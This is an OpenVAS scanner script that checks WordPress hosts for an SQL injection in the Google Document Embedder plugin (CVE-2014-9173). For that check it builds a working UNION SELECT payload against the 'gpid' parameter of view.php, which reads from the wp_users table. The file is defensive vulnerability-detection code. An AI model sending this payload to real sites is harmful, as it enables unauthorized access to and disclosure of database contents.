###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wp_google_document_embedder_sql_inj_vuln.nasl 11974 2018-10-19 06:22:46Z cfischer $
#
# Wordpress Google Document Embedder SQL Injection Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805107");
  script_version("$Revision: 11974 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-19 08:22:46 +0200 (Fri, 19 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-11-28 11:35:28 +0530 (Fri, 28 Nov 2014)");
  script_name("Wordpress Google Document Embedder SQL Injection Vulnerability");
  script_cve_id("CVE-2014-9173");

  script_tag(name:"summary", value:"This host is installed with WordPress
  Google Document Embedder and is prone to sql injection vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not.");

  script_tag(name:"insight", value:"Flaw is due to the /google-document-embedder
  /view.php script not properly sanitizing user-supplied input via the
  'gpid' GET parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to manipulate SQL queries in the backend database, and disclose certain
  sensitive information.");

  script_tag(name:"affected", value:"WordPress Google Doc Embedder Plugin
  version 2.5.14, prior may also be affected.");

  script_tag(name:"solution", value:"Upgrade to version 2.5.15 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://1337day.com/exploit/22921");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/98944");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/35371");
  script_xref(name:"URL", value:"https://wpvulndb.com/vulnerabilities/7690");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/google-document-embedder");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + "/wp-content/plugins/google-document-embedder/view.php?"
          + "embedded=1&gpid=0%20UNION%20SELECT%201,%202,%203,%20CO"
          + "NCAT(CAST(CHAR(97,%2058,%2049,%2058,%20123,%20115,%205"
          + "8,%2054,%2058,%2034,%20118,%20119,%2095,%2099,%20115,%"
          + "20115,%2034,%2059,%20115,%2058)%20as%20CHAR),%20LENGTH"
          + "(user_registered),%20CAST(CHAR(58,%2034)%20as%20CHAR),"
          + "%20user_registered,%20CAST(CHAR(34,%2059,%20125)%20as%"
          + "20CHAR))%20FROM%20%60wp_users%60%20WHERE%20ID=1";


if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
  pattern:"<link rel=.stylesheet.*type=.*href=.[0-9]{2,4}-[0-9]{2,4}-[0-9]{2,4} [0-9][0-9]:[0-9][0-9]:[0-9][0-9].>",
  extra_check:make_list(">Google Docs - Viewer<", ">Viewer<")))
{
  security_message(port:http_port);
  exit(0);
}
